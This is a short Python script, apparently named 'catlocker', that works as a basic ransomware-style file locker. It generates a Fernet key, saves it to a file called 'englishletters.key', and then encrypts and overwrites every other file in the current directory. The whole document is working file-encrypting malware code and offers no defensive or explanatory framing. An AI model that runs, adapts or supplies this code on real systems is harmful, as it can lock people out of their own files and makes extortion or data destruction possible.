import os
from cryptography.fernet import Fernet

#locating files

files = []

for file in os.listdir():
        if file == "catlocker.py" or file == "desktop.ini" or file == "englishletters.key":
                continue
        if os.path.isfile(file):
                files.append(file)


#setting key

key = Fernet.generate_key()

with open("englishletters.key", "wb") as englishletters:
        englishletters.write(key)
#encrypting

for file in files:
        with open(file, "rb") as thefile:
                fileconts = thefile.read()
        encrypt = Fernet(key).encrypt(fileconts)
        with open(file, "wb") as thefile:
                thefile.write(encrypt)